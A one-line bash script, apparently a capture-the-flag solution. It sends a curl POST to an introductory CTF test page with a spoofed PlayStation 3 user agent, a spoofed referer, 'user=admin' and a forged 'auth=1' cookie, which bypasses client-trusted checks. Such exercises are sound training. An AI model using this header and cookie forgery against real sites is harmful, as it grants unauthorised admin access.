#!/bin/bash

curl -A "User-Agent: Mozilla/5.0 (PLAYSTATION 3; 3.55)" --data "user=admin" --cookie "auth=1" -e "www.stuycs.org" http://introctf.koding.io/test.php
